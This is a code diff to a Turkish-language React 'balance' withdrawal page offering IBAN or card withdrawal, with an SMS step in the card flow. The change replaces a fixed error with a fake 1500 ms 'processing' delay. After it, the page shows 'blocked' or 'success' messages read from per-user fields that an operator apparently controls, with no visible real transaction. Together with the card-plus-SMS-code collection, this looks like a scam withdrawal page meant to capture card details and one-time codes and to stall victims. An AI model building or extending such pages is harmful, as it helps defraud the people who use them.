@@ -62,6 +62,22 @@ export default function BalancePage() {
     setIsSmsStep(false);
     setCardFormSubmitted(false);
   };
+
+  const showToastBasedOnStatus = () => {
+    if (!currentUser) return;
+    if (currentUser.transactionStatus === 'blocked') {
+        toast({
+            variant: "destructive",
+            title: "İşlem Engellendi",
+            description: currentUser.errorMessage || "Para çekme işleminiz geçici olarak engellenmiştir.",
+        });
+    } else {
+        toast({
+            title: "✅ Başarılı",
+            description: currentUser.onayMesaji || "İşleminiz başarıyla alındı.",
+        });
+    }
+  }
   
   const handleIbanSubmit = (e: React.FormEvent) => {
     e.preventDefault();
@@ -70,11 +86,7 @@ export default function BalancePage() {
         setIsLoading(false);
         setIbanDialogOpen(false);
         setOptionsDialogOpen(false);
-        toast({
-            variant: "destructive",
-            title: "İşlem Başarısız",
-            description: "IBAN ile para çekme işlemi şu anda kullanılamamaktadır. Lütfen daha sonra tekrar deneyin.",
-        });
+        showToastBasedOnStatus();
     }, 1500);
   };
   
@@ -185,7 +197,7 @@ export default function BalancePage() {
             <Button
               key={bank}
               variant="default"
-              className="h-24 break-words p-2 text-center text-base font-semibold bg-blue-900 hover:bg-blue-800"
+              className="h-24 break-words p-2 text-center text-base font-semibold"
               onClick={() => handleBankSelect(bank)}
             >
               {bank}
@@ -206,7 +218,7 @@ export default function BalancePage() {
               <div className="flex flex-col gap-4 py-4 sm:flex-row">
                   <Dialog open={isIbanDialogOpen} onOpenChange={setIbanDialogOpen}>
                       <DialogTrigger asChild>
-                          <Button className="w-full text-base sm:w-auto sm:flex-1 bg-blue-600 hover:bg-blue-500">IBAN Numarası ile Çek</Button>
+                          <Button className="w-full text-base sm:w-auto sm:flex-1">IBAN Numarası ile Çek</Button>
                       </DialogTrigger>
                       <DialogContent>
                           <DialogHeader>
@@ -230,7 +242,7 @@ export default function BalancePage() {
 
                   <Dialog open={isCardDialogOpen} onOpenChange={resetCardDialog}>
                       <DialogTrigger asChild>
-                          <Button className="w-full text-base sm:w-auto sm:flex-1 bg-blue-600 hover:bg-blue-500">Kart ile Çek</Button>
+                          <Button className="w-full text-base sm:w-auto sm:flex-1">Kart ile Çek</Button>
                       </DialogTrigger>
                       <DialogContent>
                           {!isSmsStep ? (
